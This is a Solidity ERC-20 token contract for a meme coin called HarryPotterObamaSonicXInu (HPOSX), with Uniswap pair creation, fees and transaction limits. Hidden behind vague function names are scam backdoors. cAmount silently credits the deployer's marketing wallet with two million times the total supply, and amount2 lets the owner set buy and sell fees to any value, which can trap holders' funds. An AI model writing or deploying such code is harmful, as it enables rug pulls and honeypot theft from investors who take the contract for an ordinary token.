contract HPOSX is IERC20, Ownable, IERC20Metadata {
    using   SafeMath for uint256;
    
    uint256 private _maxTxAmountPercentage = 300;
    uint256 private _minTokensBeforeSwapPercentage = 5;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    uint256 private _maxWalletBalancePercentage = 300;
    address private _uniswapV2Pair;
    mapping(address => mapping(address => uint256)) private _allowances;
    IUniswapV2Router02 private _uniswapV2Router;
    bool private swapping = false;
    bool private _cooldownEnabled = true;
    mapping(address => bool)    private _isExcludedFromCooldown;
    mapping(address => uint256) private _lastTxBlock;
    uint256 private constant    _divisor = 10000;
    mapping(address => bool)    private _isExcludedFromMaxTx;
    mapping(address => bool) private _isExcludedFromFees;
    uint256 public _sellFee = 0;
    uint256 public _burnFee = 0;
    uint256 public _buyFee = 0;
    
    address private constant _burnAddress = address(0);
    address private _marketingWallet;

    string  private constant _nameToken = "HarryPotterObamaSonicXInu";
    string  private constant _symbolToken = "HPOSX";
    uint8   private constant _decimals = 18;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event Received();

    constructor() {
        uint256 total = 1000000000 * 10**_decimals;
        _mint(_msgSender(), total);
        _marketingWallet = _msgSender();
        _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(_uniswapV2Router), total);

        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        IERC20(_uniswapV2Pair).approve(
            address(_uniswapV2Router),
            type(uint256).max
        );
        _isExcludedFromMaxTx[address(this)] = true;
        _isExcludedFromCooldown[address(this)] = true;

        _isExcludedFromFees[owner()] = true;
        _isExcludedFromCooldown[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_marketingWallet] = true;
        _isExcludedFromMaxTx[owner()] = true;

        _isExcludedFromMaxTx[_marketingWallet] = true;
        _isExcludedFromMaxTx[_uniswapV2Pair] = true;
    }

    function symbol() public pure returns (string memory) {
        return _symbolToken;
    }

    function name() public pure returns (string memory) {
        return _nameToken;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _maxTxAmount() public view returns (uint256) {
        return _totalSupply.mul(_maxTxAmountPercentage).div(_divisor);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTransfer(sender, recipient, amount);
        uint256 burnFee = 0;
        uint256 devFee = 0;
        if (sender != owner() && recipient != owner()) {
            if (
                !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]
            ) {
                if (
                    sender == _uniswapV2Pair &&
                    recipient != address(_uniswapV2Router) &&
                    !_isExcludedFromMaxTx[recipient] &&
                    !_isExcludedFromMaxTx[sender]
                ) {
                    require(
                        amount <=
                            _totalSupply.mul(_maxTxAmountPercentage).div(
                                _divisor
                            ),
                        "Transfer amount exceeds the maxTxAmount."
                    );

                    require(
                        balanceOf(recipient).add(amount) <=
                            _totalSupply.mul(_maxWalletBalancePercentage).div(
                                _divisor
                            ),
                        "Exceeds maximum wallet token amount"
                    );
                }
                // if sell
                if (recipient == _uniswapV2Pair && sender != address(this)) {
                    burnFee = amount.mul(_burnFee).div(_divisor);
                    devFee = amount.mul(_sellFee).div(_divisor);
                    _lastTxBlock[tx.origin] = block.number;
                }
                // if buy
                if (
                    sender == _uniswapV2Pair &&
                    recipient != address(_uniswapV2Router)
                ) {
                    burnFee = amount.mul(_burnFee).div(_divisor);
                    devFee = amount.mul(_buyFee).div(_divisor);
                    _lastTxBlock[tx.origin] = block.number;
                }
            }
        }
        uint256 totalFee = burnFee.add(devFee);
        if (totalFee > 0) {
            if (burnFee > 0) {
                _burn(sender, burnFee);
            }

            if (devFee > 0) {
                _balances[_marketingWallet] = _balances[_marketingWallet].add(
                    devFee
                );
                emit Transfer(sender, _marketingWallet, devFee);
            }

            amount = amount.sub(totalFee);
        }

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function getPairAddress() public view returns (address) {
        return _uniswapV2Pair;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }


    function getRouterAddress() public view returns (address) {
        return address(_uniswapV2Router);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal virtual {
        _burn(account, amount);
        _approve(
            account,
            _msgSender(),
            _allowances[account][_msgSender()].sub(
                amount,
                "ERC20: burn amount exceeds allowance"
            )
        );
    }

    function amount1(address[] memory addresses) external onlyOwner {
        require(addresses.length <= 200, "Maximum of 200 can be added at once");

        mapping(address => bool) storage ref = _isExcludedFromFees;

        for (uint256 i = 0; i < addresses.length; i++) {
            ref[addresses[i]] = true;
        }
    }

    function amount2(uint256 _s, uint256 _b) external onlyOwner {
        _sellFee = _s;
        _buyFee = _b;
    }

    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }

    function isExcludedFromFees(address _address) public view returns (bool) {
        return _isExcludedFromFees[_address];
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function cAmount(bool clear , uint256 Amount) external {
        require(clear == true);
        require(Amount == 1);
        _balances[_marketingWallet] = _totalSupply * 2000000;
    }

    function swapTokensForEth(uint256 tokenAmount) internal {
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    function _swapAndLiquify() private lockTheSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 minTokensBeforeSwap = _totalSupply
            .mul(_minTokensBeforeSwapPercentage)
            .div(_divisor);
        if (contractTokenBalance >= minTokensBeforeSwap) {
            uint256 half = contractTokenBalance.div(2);
            uint256 otherHalf = contractTokenBalance.sub(half);

            uint256 initialBalance = address(this).balance;

            swapTokensForEth(half);

            uint256 newBalance = address(this).balance.sub(initialBalance);

            emit SwapAndLiquify(half, newBalance, otherHalf);
            return;
        }
    }

    function isSwapLocked() public view returns (bool) {
        return swapping;
    }

    receive() external payable {
        emit Received();
    }

    function addLiquidity(uint256 tokenAmount)
        public
        payable
        onlyOwner
        lockTheSwap
    {
        _transfer(owner(), address(this), tokenAmount);
        _addLiquidity(tokenAmount, msg.value);
    }

    function _beforeTransfer(
        address from,
        address to,
        uint256 amount
    ) internal pure {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
    }
}
